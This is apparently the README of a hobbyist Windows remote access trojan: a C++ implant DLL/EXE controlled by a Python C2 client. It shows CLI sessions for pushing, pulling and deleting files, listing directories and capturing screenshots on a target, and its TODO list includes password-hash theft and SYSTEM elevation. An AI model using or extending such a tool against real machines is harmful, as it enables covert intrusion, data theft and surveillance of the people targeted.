# Windows-RAT
This repository will serve as an exploratory environment where I will rely primarily on C++ and Windows APIs to delve into the deeper aspects of Windows security management along with the varying components and architectures that come within the Windows environment.

## Table of Contents
- [Windows-RAT](#windows-rat)
  - [Table of Contents](#table-of-contents)
  - [Repository Breakdown](#repository-breakdown)
    - [Pcaps](#pcaps)
    - [RAT-DLL](#rat-dll)
    - [RAT-Py](#rat-py)
    - [RAT-Exe](#rat-exe)
  - [Assumptions](#assumptions)
  - [Testing Environment](#testing-environment)
  - [Build Environment](#build-environment)
  - [Examples](#examples)
    - [Startup](#startup)
      - [Required Args](#required-args)
      - [Optional Args](#optional-args)
    - [Perform a *put file*](#perform-a-put-file)
      - [Required Args](#required-args-1)
      - [Optional Args](#optional-args-1)
    - [Perform a *get file*](#perform-a-get-file)
      - [Required Args](#required-args-2)
      - [Optional Args](#optional-args-2)
    - [Perform a *dir list*](#perform-a-dir-list)
      - [Required Args](#required-args-3)
      - [Optional Args](#optional-args-3)
    - [Perform a *delete file*](#perform-a-delete-file)
      - [Required Args](#required-args-4)
      - [Optional Args](#optional-args-4)
    - [Perform a *screenshot*](#perform-a-screenshot)
      - [Required Args](#required-args-5)
      - [Optional Args](#optional-args-5)
  - [TODO](#todo)
    - [Exisiting Features:](#exisiting-features)
    - [New Features:](#new-features)
    - [Bugs](#bugs)

## Repository Breakdown

### Pcaps
Packet captures between C2 and implant in a test environment for different commands. These help reinforce how interaction between our C2 and implant works for each command type. 

### RAT-DLL
All cpp *implant* side code that will, upon executing, open up a port on target and listen for commands sent by the user via Python CLI.

### RAT-Py
All py *client* side code that will, upon executing, open up a port on client and send commands to the implant via user input in the CLI.

### RAT-Exe
All cpp *implant* side code that will, upon executing, survey the target prior to loading our DLL that implements our functionality and opens communications back to client to accept commands.

## Assumptions
Current assumptions will include:
- The user has access to the target machine + network
- The user has the ability to or already has dropped .exe and .dll on target
- The user has remote shell/execution capabilities to launch payload on target
- Traditional antivirus programs have been disabled/mitigated

## Testing Environment
- Target machine is Window 10 Education version 10.0.19043 build 19043
- Python version for client is 3.7.16 (important for scapy use)

## Build Environment
- Visual Studio 2019 version 16.11.20

## Examples
### Startup
#### Required Args
- ip - IP address of target
- port - port number our implant is listening on
#### Optional Args
- N/A
```
pjsacchet@Patrick-Desktop:/mnt/c/Users/Admin/Projects/Personal/Windows-RAT/RAT-Py$ python3 RAT_Py_Main.py -ip 192.168.111.128 -port 1550
Reaching out to agent for connection establishment... 
Connected to agent at 192.168.111.128 on port 1550 
Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit

```

### Perform a *put file*
#### Required Args
- filepath - Path (locally) to file with contents we are writing to target
- outfilepath - Remote file path where we want to write our file contents to 
#### Optional Args
- overwrite - Whether or not to overwrite the file locally if it already exits (default is false)
```
> 1
Required params:

               -filepath - local path to file we are writing

               -outputfilepath - remote path we are writing to

Optional params:

               -overwrite - overwrite the file if it already exists (default: false)

> -filepath /mnt/c/Users/Admin/Projects/Personal/test.txt -outputfilepath C:\test2.txt
Sending command...
Sending file path...
Sending file contents...
Sending overwrite...
Sent data to implant; waiting on response code...
Successful file put!
Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit
```

### Perform a *get file*
#### Required Args
- filepath - File path on target to the file we want to get 
- outfilepath - Local file path where we want to write our file contents to 
#### Optional Args
- overwrite - Whether or not to overwrite the file locally if it already exits (default is false)
```
> 2
Required params:

                -filepath - path to file on target

                -outfilepath - file to write to locally
Optional params:
                - overwrite - overwrite the file locally if it already exists
                
> -filepath C:\test.txt -outfilepath /mnt/c/Users/Admin/Projects/Personal/Windows-RAT/TestFiles/test.txt
Successful file get! Getting file contents...
Successfully wrote file contents to /mnt/c/Users/Admin/Projects/Personal/Windows-RAT/TestFiles/test.txt
Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit
```

### Perform a *dir list*
#### Required Args
- path - path to directory we would like to list off target
#### Optional Args
- N/A
```
> 3
Required params:

                -path - path to directory we're listing off target

> -path C:\Users\Admin\Documents
Sending command...
Sending dir path...
Files in C:\Users\Admin\Documents:
        .
        ..
        Debugger-Command.txt
        desktop.ini
        Internals-DLL.dll
        Internals-Exe.exe
        My Music
        My Pictures
        My Videos
        RAT-Dll.dll
        RAT-Exe.exe

Successful dir list!

Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit
```

### Perform a *delete file*
#### Required Args
- filepath - path to the file we're deleting off target
#### Optional Args
- N/A
```
> 4
Required params:

                -filepath - path to the file we're deleting off target

> -filepath C:\test2.txt
Sending command...
Sending file path...
Successful delete file!

Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit
```

### Perform a *screenshot*
#### Required Args
- filepath - path where we would like to write our screenshot to locally
#### Optional Args
- N/A
```
> 5
Required params:

                -filepath - Path where we would like to write our screenshot to locally

> -filepath /mnt/c/Screenshots/screenshot.bmp
Sending command...
Successful screenshot! Getting file size...
File is 14745654 bytes; Receiving data...
Successfully wrote file to disk... awaiting implant reponse code...
Successful screenshot!

Please select from the following options:

                1) Write a file to a location on target

                2) Get a file from a specific location on target

                3) Perform a dir list for a particular directory on target

                4) Perform a delete file off target

                5) Take a screenshot of target (will get file and delete file off target)

                0) Exit
```

## TODO
### Exisiting Features: 
- Flesh out getfile functionality
  - Eventually add flags for offsets into file and chunksizes to send back to C2?
  - Should send back file size first then full size... currently only take 1024 bytes
- Flesh out putfile functionality
  - Implement C2 OK messages to ensure it has the param or resend if need be
- Flesh out dirlist functionality
  - Implement recursive dir lists + additional file info 
- Flesh out deletefile functionality 
  - Return number of bytes we successfully deleted?
- Fleshout screenshot functionality
  - Refactor; add output param for file buffer contents and send our data back in the caller not callee
  
### New Features:
- Implement registry key read/write add/delete
  - Add registry key value listing 
- Implement get system info 
- Implement password hash stealing via registry reads 
- Enable SYSTEM elevation
- Process list 
  - Return specific info about a particular process
- Start/stop processes?
  - Flags for permissions, process name etc.
- Have exe perform survey, report results back to C2 and have C2 send DLL payload for loading 
- Make it so command keywords are actual words; get rid of numbers
- Implement basic encryption? 
  - Give both implant and C2 same key or something for packet encryption
- Add specific error messages and translate function for easy debug messages
- Currently only support ASCII... could do unicode pretty easily?
  
### Bugs
- Exe does not exit 'cleanly'
- Even if exe exits we do not alert our C2, so it still thinks its connected
